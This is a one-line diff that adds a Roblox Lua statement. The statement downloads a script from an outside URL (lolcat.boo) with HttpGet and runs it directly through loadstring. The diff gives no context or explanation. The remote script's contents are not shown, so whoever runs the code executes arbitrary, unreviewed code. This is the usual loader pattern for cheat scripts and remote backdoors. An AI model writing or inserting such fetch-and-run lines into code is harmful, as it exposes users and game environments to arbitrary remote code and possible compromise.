@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lolcat.boo/awesomescript"))()
